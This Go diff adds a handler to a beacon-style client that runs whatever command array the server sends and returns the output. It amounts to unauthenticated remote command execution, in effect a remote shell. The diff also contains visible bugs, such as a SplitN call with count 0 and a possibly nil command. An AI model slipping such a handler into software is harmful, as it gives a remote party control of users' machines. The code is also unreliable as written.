@@ -26,6 +26,9 @@ import (
 	"time"
 	"bytes"
 	"strings"
+	"os/exec"
+	"strconv"
+	"encoding/json"
 )
 
 const (
@@ -207,18 +210,56 @@ func readUpdates(client *clientinfo, buff *bytes.Buffer) {
 		log.Printf("Failed to Unmarshal response packet: %s", err)
 		return
 	}
-	if brp.Flags & RESPONSE_BEACON_UPDATES == 0 {
-		log.Printf("Invalid response for beacon updates")
-		return
+	if brp.Flags & RESPONSE_BEACON_UPDATES != 0 {
+		splitnl := strings.SplitAfter(brp.Data, "\n")
+		client.Lock()
+		defer client.Unlock()
+		client.nodes = make(map[string]struct{})
+		for _, line := range splitnl {
+			client.nodes[line] = struct{}{}
+		}
+		log.Printf("New beacon list: \n%#v", client.nodes)
+		log.Println("Completed parsing response from server")
+	} else if brp.Flags & RESPONSE_SYSTEM != 0 {
+		handleSystem(client, &brp)
 	}
-	splitnl := strings.SplitAfter(brp.Data, "\n")
-	client.Lock()
-	defer client.Unlock()
-	client.nodes = make(map[string]struct{})
-	for _, line := range splitnl {
-		client.nodes[line] = struct{}{}
-	}
-	log.Printf("New beacon list: \n%#v", client.nodes)
-	log.Println("Completed parsing response from server")
 }
 
+func handleSystem(client *clientinfo, brp *BeaconResponsePacket) {
+	cd := strings.SplitN(brp.Data, "\n", 0)
+	if len(cd) != 2 {
+		log.Println("Sent control is invalid", brp.Data)
+		return
+	}
+	_, err := strconv.Atoi(cd[0])
+	if err != nil {
+		log.Println("Sent control is invalid not integer:", cd[0])
+		return
+	}
+	command := cd[1]
+	var cmd []string
+	if err = json.Unmarshal([]byte(command), &cmd); err != nil {
+		log.Println("Sent control: Failed to unmarshal: ", err)
+		return
+	}
+	var com *exec.Cmd
+	if len(cmd) == 1 {
+		com = exec.Command(cmd[0])
+	} else if len(cmd) > 1 {
+		com = exec.Command(cmd[0], cmd[1:]...)
+	}
+	output, err := com.CombinedOutput()
+	log.Println("Combined output:", output)
+	outputstr := cd[0] + "\n" + string(output)
+	end := len(outputstr)
+	if end > MAX_CTRL {
+		end = MAX_CTRL
+	}
+	outputstr = outputstr[:end]
+	var datapacket BeaconLogPacket
+	datapacket.Flags = CURRENT_VERSION
+	datapacket.Flags |= REQUEST_CONTROL_COMPLETE
+	copy(datapacket.Uuid[:], client.uuid[:])
+	datapacket.ControlData = outputstr
+	sendData(client, &datapacket)
+}
